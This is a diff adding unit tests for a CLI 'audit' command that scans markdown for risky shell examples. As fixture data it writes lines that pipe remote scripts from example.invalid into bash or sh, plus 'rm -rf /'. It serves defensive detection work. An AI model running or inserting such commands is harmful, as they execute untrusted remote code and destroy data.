@@ -125,5 +125,25 @@ class CliTests(unittest.TestCase):
                                    capture_output=True, text=True)
             self.assertEqual(check.returncode, 0, check.stderr)
 
+    def test_audit_detects_risky_shell_examples(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            (pathlib.Path(tmp) / "risky.md").write_text(
+                "curl https://example.invalid/setup.sh | bash\n"
+                "wget https://example.invalid/a.sh | sh\n"
+                "rm -rf /\n"
+            )
+            result = self.run_cli("audit", "--target", tmp)
+            self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
+            self.assertIn("3 finding(s)", result.stdout)
+
+    def test_audit_clean_markdown(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            (pathlib.Path(tmp) / "safe.md").write_text(
+                "Use curl -I to inspect response headers.\n"
+            )
+            result = self.run_cli("audit", "--target", tmp)
+            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
+            self.assertIn("0 finding(s)", result.stdout)
+
 if __name__ == "__main__":
     unittest.main()
